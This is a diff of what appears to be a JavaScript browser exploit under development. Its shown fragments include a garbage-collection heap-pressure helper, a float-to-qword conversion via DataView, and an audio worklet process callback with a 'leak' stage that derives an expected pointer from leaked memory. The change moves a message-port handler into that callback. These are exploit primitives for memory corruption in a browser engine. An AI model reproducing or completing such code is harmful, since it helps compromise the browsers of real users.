@@ -524,12 +524,7 @@ function gc() {
             new ArrayBuffer(0x1000000);
         }
 }
-fuck.port.onmessage = function(e) {
-  //print1('Message received from main script');
-  var workerResult = 'Result: ' + (e.data[0] * e.data[1]);
-  //fuck.port.postMessage('Posting message back to main script');
-  fuck.port.postMessage(workerResult);
-};
+
 let data_view = new DataView(new ArrayBuffer(8));
 var floatAsQword = float => {
     data_view.setFloat64(0, float, true);
@@ -608,7 +603,15 @@ for(var i = 0; i < 0x10000; i++){
 `);
 b.process = (inputs, outputs, parameters)=>{
     //sa
-    //fuck.port.postMessage("starting");
+    //
+    fuck.port.onmessage = function(e) {
+  //print1('Message received from main script');
+  var workerResult = 'Result: ' + (e.data[0] * e.data[1]);
+  //fuck.port.postMessage('Posting message back to main script');
+  alert(workerResult);
+};
+    fuck.port.postMessage("starting");
+    
     if(stage == "leak"){
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
